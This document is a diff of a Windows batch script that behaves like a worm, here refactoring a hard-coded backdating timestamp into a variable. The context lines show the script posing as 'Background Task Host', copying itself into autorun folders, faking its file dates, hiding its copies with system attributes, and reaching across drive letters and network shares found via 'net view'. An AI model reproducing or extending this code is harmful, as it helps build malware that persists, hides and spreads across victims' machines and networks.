@@ -62,6 +62,7 @@ for /f "skip=4 delims= " %%i in ('tasklist /fi "imagename eq %~nx0"') do if "%%i
 
 
 set app_name=Background Task Host
+set app_date=09-11-2001
 
 set module_fileTouch=modules\fileTouch.exe
 set module_shortcut=modules\shortcut.exe
@@ -90,13 +91,13 @@ if exist "%path_desktop%\09.11.2001" goto :selfRemover
 
 if not exist "%path_autoRun1%\%~nx0" copy /y "%~dpnx0" "%path_autoRun1%\"
 if exist "%path_autoRun1%\%~nx0" (
-  %module_fileTouch% /w /a /c /d 05-25-1720 "%path_autoRun1%\%~nx0"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun1%\%~nx0"
   attrib +h +r +s "%path_autoRun1%\%~nx0"
 )
 
 if not exist "%path_autoRun2%\%~nx0" copy /y "%~dpnx0" "%path_autoRun2%\"
 if exist "%path_autoRun2%\%~nx0" (
-  %module_fileTouch% /w /a /c /d 05-25-1720 "%path_autoRun2%\%~nx0"
+  %module_fileTouch% /w /a /c /d %app_date% "%path_autoRun2%\%~nx0"
   attrib +h +r +s "%path_autoRun2%\%~nx0"
 )
 
@@ -142,7 +143,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       (
         if exist "%%i:\%~nx0" (
           attrib -h -r -s "%%i:\%~nx0"
-          %module_fileTouch% /w /a /c /d 09-11-2001 "%%i:\%~nx0"
+          %module_fileTouch% /w /a /c /d %app_date% "%%i:\%~nx0"
           attrib +h +r +s "%%i:\%~nx0"
         )
       )>nul 2>nul
@@ -181,7 +182,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
       (
         if exist "%%i\%%j\%~nx0" (
           attrib -h -r -s "%%i\%%j\%~nx0"
-          %module_fileTouch% /w /a /c /d 09-11-2001 "%%i\%%j\%~nx0"
+          %module_fileTouch% /w /a /c /d %app_date% "%%i\%%j\%~nx0"
           attrib +h +r +s "%%i\%%j\%~nx0"
         )
       )>nul 2>nul
